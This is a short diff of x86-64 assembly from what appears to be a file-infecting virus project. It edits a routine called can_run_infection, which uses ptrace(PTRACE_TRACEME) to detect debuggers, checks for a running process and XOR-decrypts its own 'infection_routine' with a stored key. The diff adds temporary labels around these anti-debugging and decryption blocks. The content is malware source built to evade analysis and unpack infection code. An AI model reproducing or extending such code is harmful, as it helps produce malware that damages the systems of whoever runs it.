@@ -79,6 +79,7 @@ begin:
 ; int can_run_infection();
 ; rax can_run_infection();
 can_run_infection:
+.TMP_anti_debugging:
 	mov rax, SYS_PTRACE				; _ret = ptrace(
 	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
 	xor rsi, rsi					; 	0,
@@ -90,8 +91,10 @@ can_run_infection:
 	call check_process				; _ret = check_process();
 	cmp rax, 1					; if (_ret == !)
 	je .process					; 	goto .process;
+.TMP_END_anti_debugging:
+nop
 
-	; TODO: merge this uncipher with anti-debugger instructions
+.TMP_uncipher:
 	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
 	cmp rax, 0x0					; ...
 	je .valid					; 	goto .valid;
@@ -100,7 +103,8 @@ can_run_infection:
 	mov rsi, _end - infection_routine		; size = _end - infection_routine
 	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
-	; TODO: check file is really unciphered
+.TMP_END_uncipher:
+nop
 
 	.valid:
 		mov rax, 1					; return 1;
